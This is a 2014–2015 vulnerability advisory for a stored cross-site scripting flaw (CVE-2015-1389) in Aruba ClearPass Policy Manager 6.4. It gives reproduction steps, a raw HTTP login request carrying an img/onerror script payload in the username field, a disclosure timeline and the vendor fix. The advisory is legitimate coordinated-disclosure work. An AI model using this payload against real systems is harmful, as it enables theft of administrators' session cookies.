===============================================================================
                  title: ClearPass Policy Manager Stored XSS
                case id: CM-2014-01
                product: Aruba ClearPass Policy Manager
     vulnerability type: Stored cross-site script
               severity: Medium
                  found: 2014-11-24
                     by: Cristiano Maruti (@cmaruti)
===============================================================================

[EXECUTIVE SUMMARY]

 The analysis discovered a stored cross site scripting vulnerability (OWASP
 OTG-INPVAL-002) in the ClearPass Policy Manager. A malicious unauthenticated
 user is able to inject arbitrary script through the login form that may be
 rendered and triggered later if a privileged authenticated user reviews the
 access audit record.  An attack can use the aforementioned vulnerability to
 effectively steal session cookies of privileged logged on users.

[VULNERABLE VERSIONS]

The following version of the Aruba ClearPass Policy Manager was affected by the
vulnerability; previous versions may be vulnerable as well:
- Aruba ClearPass Policy Manager 6.4

[TECHNICAL DETAILS]

It is possible to reproduce the vulnerability following these steps:
1. Open the login page with your browser;
2. Put the  "><img src=x onerror=alert(1337)><" string in the username field
and fill in the password field with a value of your choice;
3. Submit the form;
4. Login to the application with an administrative user:
5. Go to "Monitoring -> Live monitoring -> Access tracker" to raise the payload.

Below a full transcript of the HTTP request used to raise the vulnerability
HTTP Request
-------------------------------------------------------------------------------
POST /tips/tipsLoginSubmit.action HTTP/1.1
Host: 10.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://10.0.0.1/tips/tipsLoginSubmit.action
Cookie: <A VALID UNAUTH COOKIE>
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 58

username="><img src=x onerror=alert("0wn3d")><"&password=test
-------------------------------------------------------------------------------

A copy of the report with technical details about the vulnerability I have
identified is available at:
https://github.com/cmaruti/reports/blob/master/aruba_clearpass.pdf


[VULNERABILITY REFERENCE]

The following CVE ID was allocated to track the vulnerability:
- CVE-2015-1389: Stored cross-site scripting (XSS)

[DISCLOSURE TIMELINE]

2014-11-24 Vulnerability submitted to vendor through the Bugcrowd
bounty program.
2014-12-09 Vendor acknowledged the problem.
2014-12-10 Researcher requested to publicly disclose the issue.
2015-02-16 Vendor released a fix for the reported issue.
2015-02-09 Vendor asked to hold-on for the public disclosure.
2015-02-22 Vendor postponed the public disclosure date
2015-02-22 Public coordinated disclosure.



[SOLUTION]

Aruba release an update to fix the vulnerability (ClearPass 6.5 or
later). Please see
the below link for further information released by the vendor:
- http://www.arubanetworks.com/assets/alert/ARUBA-PSA-2015-006.txt


[REPORT URL]

https://github.com/cmaruti/reports/blob/master/aruba_clearpass.pdf